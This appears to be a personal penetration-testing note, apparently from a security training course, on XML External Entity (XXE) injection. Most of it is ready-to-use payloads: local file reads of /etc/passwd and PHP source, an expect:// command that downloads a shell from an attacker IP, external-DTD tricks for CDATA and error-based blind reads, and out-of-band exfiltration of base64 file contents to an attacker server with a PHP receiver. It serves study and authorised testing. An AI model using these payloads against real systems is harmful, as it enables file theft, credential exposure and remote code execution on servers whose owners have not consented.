---
{"dg-publish":true,"permalink":"/xml-external-entity-injection/"}
---

- [[XXE Tools\|XXE Tools]]

- [XML External Entity (XXE) Processing \| OWASP Foundation](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [What is XXE (XML external entity) injection? Tutorial & Examples \| Web Security Academy](https://portswigger.net/web-security/xxe)

Many web applications process XML data as part of their functionality. Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user. In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server. These files may be configuration files that may contain sensitive information like passwords or even the source code of the web application, which would enable us to perform a Whitebox Penetration Test on the web application to identify more vulnerabilities. XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for remote code execution.

## [[Path traversal\|LFI]]

### 1

```xml
<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
	<name> &company; </name>
	<details>asd</details>
	<date>1111-11-11</date>
</root>
```

### 2

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
	<name>Test</name>
	<tel>123456789</tel>
	<email>
		&company;
	</email>
	<message>
		10.129.234.170
	</message>
</root>
```
```xml
```

For, [[PHP]] web application 

- PHP filters to encode PHP source files
	- such that they would not break the XML format when referenced

>PHP provides wrapper filters that allow us to [[base64]] encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:


```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## [[Remote Code Execution|RCE]] with [[XML External Entity Injection|XXE Injection]]

Need to have expect installed in [[PHP]]
- Notice the usage of [[Input Field Separators|IFS]]
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'10.10.15.11/shell.php'">
]>
```

## Advanced Exfiltration with [[CDATA]]


- We can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`)
- The XML parser would consider this part raw data
	- May contain any type of data
	- Including any special characters.

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

- If we reference the `&joined;` entity it should contain our escaped data
- However, **this will not work since XML prevents joining internal and external entities**`


### XML Parameter Entities

- [[Path traversal|LFI]]
- To bypass this limitation we can utilize `XML Parameter Entities`
	- A special type of entity that starts with a `%` character and can only be used within the [[XML Document Type Definition|DTD]]
- If we reference them from an external source (e.g. our own server) then all of them would be considered as external and can be joined

```xml
<!ENTITY joined "%begin;%file;%end;">
```
```shell-session
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>
<email>&joined;</email> 
```

## Error Based XXE

- [What is a blind XXE attack? Tutorial & Examples \| Web Security Academy](https://portswigger.net/web-security/xxe/blind)

- Another situation we may find ourselves in is one where the web **application might not write any output**
- So we cannot **control** any of the XML input entities to write its content
- We would be `blind` to the XML output and so would not be able to retrieve the file content using our usual methods.

- If the web application displays runtime errors (e.g. PHP errors) and does not have proper exception handling for the XML input
- Then we can use this flaw to read the output of the XXE exploit

### Blind error based XXE

- If the web application neither writes XML output nor displays any errors

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Out of band Data exfiltration

### File: xxe.dtd


```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

### File: index.php
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

### xml Request

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```